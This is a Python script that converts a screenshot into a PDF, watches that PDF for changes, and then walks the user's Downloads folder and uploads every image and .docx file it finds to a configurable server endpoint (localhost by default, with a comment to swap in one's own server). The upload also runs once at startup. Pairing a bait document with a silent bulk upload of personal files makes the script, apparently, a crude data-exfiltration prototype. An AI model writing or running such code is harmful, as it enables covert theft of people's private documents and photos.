from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from PIL import Image
import os
import time
import requests
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

def convert_image_to_pdf(image_path, output_pdf):
    try:
        img = Image.open(image_path)
        img_width, img_height = img.size
        print("Image dimensions:", img_width, img_height)
        
        c = canvas.Canvas(output_pdf, pagesize=(img_width, img_height))
        c.drawImage(image_path, 0, 0, width=img_width, height=img_height)
        c.save()
        print("PDF created at:", output_pdf)
    except Exception as e:
        print(f"Error converting image to PDF: {e}")

class PDFOpenHandler(FileSystemEventHandler):
    def __init__(self, pdf_path, scan_function):
        self.pdf_path = pdf_path
        self.scan_function = scan_function

    def on_modified(self, event):
        print(f"Event detected: {event.event_type} - {event.src_path}")
        if event.src_path == self.pdf_path:
            print(f"PDF {self.pdf_path} was accessed")
            self.scan_function()

def scan_system():
    print("Scanning system for files...")
    user_documents_folder = os.path.expanduser("~/Downloads")
    print(f"Scanning folder: {user_documents_folder}")
    for root, dirs, files in os.walk(user_documents_folder):
        for file in files:
            if file.lower().endswith((".jpg", ".png", ".docx")):
                file_path = os.path.join(root, file)
                print(f"Found file: {file_path}")
                upload_file(file_path)

def upload_file(file_path):
    print(f"Uploading file: {file_path}")
    url = "http://127.0.0.1:5000/upload"  # Change to your Flask server URL
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(url, files=files)
            print(response.json())
    except Exception as e:
        print(f"Error uploading file: {e}")

if __name__ == "__main__":
    input_image_path = r"C:\Users\khand\Pictures\Screenshots\Screenshot (20).png"
    output_pdf_path = "output.pdf"
    
    # Convert image to PDF
    convert_image_to_pdf(input_image_path, output_pdf_path)

    # Get the directory containing the output PDF
    output_pdf_dir = os.path.dirname(os.path.abspath(output_pdf_path))
    print("PDF directory:", output_pdf_dir)

    # Ensure the directory exists
    if not os.path.exists(output_pdf_dir):
        print(f"Directory does not exist: {output_pdf_dir}")
    else:
        # Set up watchdog to monitor the PDF file
        event_handler = PDFOpenHandler(os.path.abspath(output_pdf_path), scan_system)
        observer = Observer()
        observer.schedule(event_handler, path=output_pdf_dir, recursive=False)
        observer.start()
        print(f"Started monitoring {output_pdf_path}")
        scan_system()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            observer.stop()
        observer.join()
